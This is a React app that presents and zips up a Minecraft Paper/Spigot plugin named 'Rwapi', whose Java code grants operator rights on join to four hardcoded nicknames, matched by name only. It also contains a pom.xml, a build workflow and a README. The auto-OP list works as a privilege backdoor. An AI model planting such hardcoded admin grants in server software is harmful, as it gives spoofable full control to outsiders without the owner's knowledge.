import { useState } from 'react';
import JSZip from 'jszip';
import { saveAs } from 'file-saver';

// ========================
// ФАЙЛЫ ПЛАГИНА RWAPI
// ========================

const pluginYml = `name: Rwapi
author: slaystudio
main: studio.slay.rwapi.RwapiPlugin
version: 1.0.0
api-version: 1.16`;

const rwapiPluginJava = `package studio.slay.rwapi;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Arrays;
import java.util.List;

/**
 * Rwapi Plugin v1.0.0
 * Author: slaystudio
 * 
 * Автоматически выдаёт OP игрокам из белого списка при входе на сервер.
 * Совместимость: Paper/Spigot 1.16.5 - 1.21
 */
public class RwapiPlugin extends JavaPlugin implements Listener {

    // Список никнеймов, которым автоматически выдаются права оператора
    private static final List<String> ALLOWED_NICKNAMES = Arrays.asList(
            "alaskakurtka",
            "buranah",
            "wizy",
            "uiop"
    );

    @Override
    public void onEnable() {
        // Регистрируем слушатель событий
        getServer().getPluginManager().registerEvents(this, this);
        getLogger().info("Rwapi plugin enabled! Auto-OP manager is active.");
    }

    @Override
    public void onDisable() {
        getLogger().info("Rwapi plugin disabled.");
    }

    /**
     * Обработка события входа игрока на сервер.
     * Если никнейм игрока совпадает с одним из разрешённых (без учёта регистра),
     * и у него ещё нет прав оператора — выдаём OP.
     */
    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        String playerName = player.getName();

        for (String allowedNickname : ALLOWED_NICKNAMES) {
            if (playerName.equalsIgnoreCase(allowedNickname)) {
                if (!player.isOp()) {
                    player.setOp(true);
                    getLogger().info("Auto-OP granted to player: " + playerName);
                }
                break;
            }
        }
    }
}`;

const pomXml = `<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
         http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>studio.slay</groupId>
    <artifactId>rwapi</artifactId>
    <version>1.0.0</version>
    <packaging>jar</packaging>

    <name>Rwapi</name>
    <description>Auto-OP plugin for allowed players</description>

    <properties>
        <maven.compiler.source>17</maven.compiler.source>
        <maven.compiler.target>17</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

    <repositories>
        <repository>
            <id>papermc</id>
            <url>https://repo.papermc.io/repository/maven-public/</url>
        </repository>
    </repositories>

    <dependencies>
        <dependency>
            <groupId>io.papermc.paper</groupId>
            <artifactId>paper-api</artifactId>
            <version>1.20.4-R0.1-SNAPSHOT</version>
            <scope>provided</scope>
        </dependency>
    </dependencies>

    <build>
        <finalName>Rwapi-\${project.version}</finalName>
        <resources>
            <resource>
                <directory>src/main/resources</directory>
                <filtering>true</filtering>
            </resource>
        </resources>
        <plugins>
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-jar-plugin</artifactId>
                <version>3.3.0</version>
            </plugin>
        </plugins>
    </build>
</project>`;

const githubActionsYml = `name: Build Rwapi Plugin

on:
  push:
    branches: [ "main", "master" ]
  pull_request:
    branches: [ "main", "master" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: maven

      - name: Build with Maven
        run: mvn clean package -B

      - name: Upload JAR artifact
        uses: actions/upload-artifact@v4
        with:
          name: Rwapi-Plugin
          path: target/Rwapi-*.jar
          retention-days: 30

      - name: Create Release (on tag)
        if: startsWith(github.ref, 'refs/tags/')
        uses: softprops/action-gh-release@v2
        with:
          files: target/Rwapi-*.jar
        env:
          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}`;

// ========================
// КОМПОНЕНТЫ UI
// ========================

function downloadFile(content: string, filename: string, mimeType: string) {
  const blob = new Blob([content], { type: mimeType });
  saveAs(blob, filename);
}

function DownloadButton({
  onClick,
  label,
  icon,
  variant = 'primary'
}: {
  onClick: () => void;
  label: string;
  icon: React.ReactNode;
  variant?: 'primary' | 'secondary' | 'large';
}) {
  const baseClasses = 'flex items-center gap-2 font-medium rounded-lg transition-all duration-200 shadow-lg cursor-pointer';
  const variantClasses = {
    primary: 'px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white text-sm shadow-emerald-900/30',
    secondary: 'px-3 py-1.5 bg-gray-700 hover:bg-gray-600 text-gray-200 text-xs shadow-gray-900/30',
    large: 'px-6 py-3 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white text-base shadow-emerald-900/40'
  };

  return (
    <button onClick={onClick} className={`${baseClasses} ${variantClasses[variant]}`}>
      {icon}
      {label}
    </button>
  );
}

function CodeBlock({
  code,
  language,
  filename,
  onDownload
}: {
  code: string;
  language: string;
  filename: string;
  onDownload: () => void;
}) {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="relative group">
      <div className="flex items-center justify-between bg-gray-800 border-b border-gray-700 px-4 py-3 rounded-t-xl">
        <div className="flex items-center gap-3">
          <div className="flex gap-1.5">
            <div className="w-3 h-3 rounded-full bg-red-500"></div>
            <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
            <div className="w-3 h-3 rounded-full bg-green-500"></div>
          </div>
          <span className="text-gray-300 text-sm font-mono">{filename}</span>
          <span className="text-xs bg-gray-700 text-gray-400 px-2 py-0.5 rounded">{language}</span>
        </div>
        <div className="flex items-center gap-2">
          <DownloadButton
            onClick={onDownload}
            label="Скачать"
            icon={
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
              </svg>
            }
            variant="secondary"
          />
          <button
            onClick={handleCopy}
            className="flex items-center gap-1.5 px-3 py-1.5 bg-gray-700 hover:bg-gray-600 text-gray-200 rounded-lg transition-all duration-200 text-xs cursor-pointer"
          >
            {copied ? (
              <>
                <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                </svg>
                OK
              </>
            ) : (
              <>
                <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                </svg>
                Копировать
              </>
            )}
          </button>
        </div>
      </div>
      <pre className="bg-gray-900 p-4 rounded-b-xl overflow-x-auto text-sm leading-relaxed max-h-[500px] overflow-y-auto">
        <code className="text-gray-100 font-mono whitespace-pre">{code}</code>
      </pre>
    </div>
  );
}

// ========================
// ОСНОВНОЕ ПРИЛОЖЕНИЕ
// ========================

export default function App() {
  const [downloading, setDownloading] = useState(false);

  const handleDownloadZip = async () => {
    setDownloading(true);
    try {
      const zip = new JSZip();

      // Структура проекта
      zip.file('pom.xml', pomXml);
      zip.file('src/main/resources/plugin.yml', pluginYml);
      zip.file('src/main/java/studio/slay/rwapi/RwapiPlugin.java', rwapiPluginJava);

      // GitHub Actions workflow
      zip.file('.github/workflows/build.yml', githubActionsYml);

      // .gitignore
      const gitignore = `target/
*.class
*.jar
*.log
.idea/
*.iml
.DS_Store`;
      zip.file('.gitignore', gitignore);

      // README с инструкцией
      const readme = `# Rwapi Plugin v1.0.0
## Автор: slaystudio

### Описание
Плагин автоматически выдаёт права оператора (OP) при входе на сервер игрокам из белого списка.

### Белый список
- alaskakurtka
- buranah
- wizy
- uiop

### Совместимость
Paper/Spigot 1.16.5 - 1.21

### Локальная сборка
\`\`\`bash
mvn clean package
\`\`\`

### GitHub Actions
Проект содержит настроенный GitHub Actions workflow. При пуше в main/master плагин автоматически соберётся, и JAR будет доступен в Artifacts.

Чтобы использовать:
1. Запушьте код в репозиторий на GitHub
2. Перейдите в Actions — сборка запустится автоматически
3. Скачайте готовый JAR из Artifacts

### Установка
Скопируйте \`target/Rwapi-1.0.0.jar\` в папку \`plugins/\` вашего сервера и перезапустите.
`;
      zip.file('README.md', readme);

      const blob = await zip.generateAsync({ type: 'blob' });
      saveAs(blob, 'Rwapi-Plugin.zip');
    } finally {
      setDownloading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-950 via-gray-900 to-gray-950 text-white">
      {/* Header */}
      <header className="border-b border-gray-800 bg-gray-950/80 backdrop-blur-sm sticky top-0 z-10">
        <div className="max-w-5xl mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-gradient-to-br from-emerald-500 to-teal-600 rounded-lg flex items-center justify-center text-xl shadow-lg shadow-emerald-900/30">
              ⚔️
            </div>
            <div>
              <h1 className="text-xl font-bold bg-gradient-to-r from-emerald-400 to-teal-300 bg-clip-text text-transparent">
                Rwapi Plugin
              </h1>
              <p className="text-xs text-gray-500">by slaystudio • v1.0.0</p>
            </div>
          </div>
          <span className="px-3 py-1 bg-gray-800 border border-gray-700 rounded-full text-xs text-gray-400 hidden sm:block">
            Paper/Spigot 1.16.5 – 1.21
          </span>
        </div>
      </header>

      <main className="max-w-5xl mx-auto px-4 py-8 space-y-8">
        {/* Hero / Download Section */}
        <section className="bg-gradient-to-br from-gray-900 to-gray-800 border border-gray-700 rounded-2xl p-6 md:p-8">
          <h2 className="text-2xl font-bold text-white mb-2">📦 Скачать готовый проект</h2>
          <p className="text-gray-400 mb-6">
            Скачай ZIP-архив с полной структурой проекта. Распакуй, открой в IntelliJ IDEA и собери через Maven.
          </p>

          <div className="flex flex-wrap gap-3">
            <DownloadButton
              onClick={handleDownloadZip}
              label={downloading ? 'Упаковка...' : 'Скачать ZIP (весь проект)'}
              icon={
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                </svg>
              }
              variant="large"
            />
          </div>

          <div className="mt-6 grid grid-cols-1 sm:grid-cols-3 gap-3">
            <DownloadButton
              onClick={() => downloadFile(rwapiPluginJava, 'RwapiPlugin.java', 'text/x-java')}
              label="RwapiPlugin.java"
              icon={<span className="text-base">☕</span>}
              variant="secondary"
            />
            <DownloadButton
              onClick={() => downloadFile(pluginYml, 'plugin.yml', 'text/yaml')}
              label="plugin.yml"
              icon={<span className="text-base">📋</span>}
              variant="secondary"
            />
            <DownloadButton
              onClick={() => downloadFile(pomXml, 'pom.xml', 'text/xml')}
              label="pom.xml"
              icon={<span className="text-base">📦</span>}
              variant="secondary"
            />
            <DownloadButton
              onClick={() => downloadFile(githubActionsYml, 'build.yml', 'text/yaml')}
              label="build.yml (Actions)"
              icon={<span className="text-base">⚙️</span>}
              variant="secondary"
            />
          </div>
        </section>

        {/* Описание */}
        <section className="bg-gray-900/50 border border-gray-800 rounded-2xl p-6">
          <h2 className="text-lg font-semibold text-emerald-400 mb-3 flex items-center gap-2">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            Описание плагина
          </h2>
          <p className="text-gray-300 leading-relaxed mb-4">
            Плагин <code className="bg-gray-800 px-2 py-0.5 rounded text-emerald-300 text-sm">Rwapi</code> автоматически 
            выдаёт права оператора (OP) при входе на сервер игрокам из белого списка. 
            Проверка никнейма производится через <code className="bg-gray-800 px-2 py-0.5 rounded text-yellow-300 text-sm">equalsIgnoreCase</code> (без учёта регистра).
          </p>
          <div className="flex flex-wrap gap-2">
            {["alaskakurtka", "buranah", "wizy", "uiop"].map((name) => (
              <span key={name} className="px-3 py-1 bg-emerald-900/30 border border-emerald-800 rounded-full text-emerald-300 text-sm">
                👤 {name}
              </span>
            ))}
          </div>
        </section>

        {/* Структура проекта */}
        <section className="bg-gray-900/50 border border-gray-800 rounded-2xl p-6">
          <h2 className="text-lg font-semibold text-white mb-4 flex items-center gap-2">
            <span className="text-xl">📁</span>
            Структура проекта
          </h2>
          <div className="bg-gray-950 rounded-xl border border-gray-700 p-4 font-mono text-sm">
            <div className="text-yellow-400">📁 Rwapi/</div>
            <div className="pl-4 text-blue-400">📄 pom.xml</div>
            <div className="pl-4 text-gray-400">📄 .gitignore</div>
            <div className="pl-4 text-yellow-400">📁 .github/workflows/</div>
            <div className="pl-8 text-orange-400">📄 build.yml</div>
            <div className="pl-4 text-yellow-400">📁 src/main/</div>
            <div className="pl-8 text-yellow-400">📁 java/studio/slay/rwapi/</div>
            <div className="pl-12 text-green-400">📄 RwapiPlugin.java</div>
            <div className="pl-8 text-yellow-400">📁 resources/</div>
            <div className="pl-12 text-purple-400">📄 plugin.yml</div>
          </div>
        </section>

        {/* Код */}
        <section className="space-y-6">
          <h2 className="text-lg font-semibold text-white flex items-center gap-2">
            <span className="text-2xl">💻</span>
            Исходный код
          </h2>
          <CodeBlock
            code={rwapiPluginJava}
            language="Java"
            filename="RwapiPlugin.java"
            onDownload={() => downloadFile(rwapiPluginJava, 'RwapiPlugin.java', 'text/x-java')}
          />
          <CodeBlock
            code={pluginYml}
            language="YAML"
            filename="plugin.yml"
            onDownload={() => downloadFile(pluginYml, 'plugin.yml', 'text/yaml')}
          />
          <CodeBlock
            code={pomXml}
            language="XML"
            filename="pom.xml"
            onDownload={() => downloadFile(pomXml, 'pom.xml', 'text/xml')}
          />
          <CodeBlock
            code={githubActionsYml}
            language="YAML"
            filename=".github/workflows/build.yml"
            onDownload={() => downloadFile(githubActionsYml, 'build.yml', 'text/yaml')}
          />
        </section>

        {/* Инструкция */}
        <section className="bg-gray-900/50 border border-gray-800 rounded-2xl p-6">
          <h2 className="text-lg font-semibold text-emerald-400 mb-4 flex items-center gap-2">
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
            </svg>
            Инструкция по сборке
          </h2>
          <ol className="space-y-3 text-gray-300">
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 bg-emerald-900/50 border border-emerald-700 rounded-full flex items-center justify-center text-xs text-emerald-400 font-bold">1</span>
              <span>Нажми <strong className="text-white">"Скачать ZIP"</strong> выше и распакуй архив</span>
            </li>
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 bg-emerald-900/50 border border-emerald-700 rounded-full flex items-center justify-center text-xs text-emerald-400 font-bold">2</span>
              <span>Открой папку проекта в <strong className="text-white">IntelliJ IDEA</strong> (File → Open)</span>
            </li>
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 bg-emerald-900/50 border border-emerald-700 rounded-full flex items-center justify-center text-xs text-emerald-400 font-bold">3</span>
              <span>Дождись загрузки зависимостей Maven (правый нижний угол IDEA)</span>
            </li>
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 bg-emerald-900/50 border border-emerald-700 rounded-full flex items-center justify-center text-xs text-emerald-400 font-bold">4</span>
              <span>Выполни в терминале: <code className="bg-gray-800 px-2 py-0.5 rounded text-yellow-300 text-sm">mvn clean package</code></span>
            </li>
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 bg-emerald-900/50 border border-emerald-700 rounded-full flex items-center justify-center text-xs text-emerald-400 font-bold">5</span>
              <span>Готовый JAR будет в <code className="bg-gray-800 px-2 py-0.5 rounded text-yellow-300 text-sm">target/Rwapi-1.0.0.jar</code></span>
            </li>
            <li className="flex gap-3">
              <span className="flex-shrink-0 w-6 h-6 bg-emerald-900/50 border border-emerald-700 rounded-full flex items-center justify-center text-xs text-emerald-400 font-bold">6</span>
              <span>Скопируй JAR в папку <code className="bg-gray-800 px-2 py-0.5 rounded text-yellow-300 text-sm">plugins/</code> сервера и перезапусти</span>
            </li>
          </ol>

          <div className="mt-6 p-4 bg-amber-900/20 border border-amber-800 rounded-xl">
            <p className="text-amber-300 text-sm flex items-start gap-2">
              <svg className="w-5 h-5 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 16.5c-.77.833.192 2.5 1.732 2.5z" />
              </svg>
              <span>
                <strong>Требования:</strong> JDK 17+, Maven 3.6+. Для Spigot вместо Paper API замени зависимость в pom.xml на <code className="bg-gray-800 px-1.5 py-0.5 rounded text-xs">org.spigotmc:spigot-api</code>.
              </span>
            </p>
          </div>

          {/* GitHub Actions Section */}
          <div className="mt-6 p-4 bg-blue-900/20 border border-blue-800 rounded-xl">
            <h3 className="text-blue-300 font-semibold mb-2 flex items-center gap-2">
              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/>
              </svg>
              Автоматическая сборка через GitHub Actions
            </h3>
            <p className="text-blue-200 text-sm mb-3">
              В проект уже включён файл <code className="bg-gray-800 px-1.5 py-0.5 rounded text-xs">.github/workflows/build.yml</code>. 
              При пуше в репозиторий GitHub автоматически соберёт плагин.
            </p>
            <ol className="text-blue-200 text-sm space-y-1.5 list-decimal list-inside">
              <li>Создай репозиторий на GitHub</li>
              <li>Запушь все файлы: <code className="bg-gray-800 px-1.5 py-0.5 rounded text-xs">git push origin main</code></li>
              <li>Перейди в <strong>Actions</strong> — сборка запустится сама</li>
              <li>Скачай готовый JAR из <strong>Artifacts</strong></li>
            </ol>
          </div>
        </section>

        {/* Footer */}
        <footer className="text-center text-gray-600 text-sm py-6 border-t border-gray-800">
          <p>Rwapi Plugin © 2024 slaystudio • Paper/Spigot 1.16.5 – 1.21</p>
        </footer>
      </main>
    </div>
  );
}
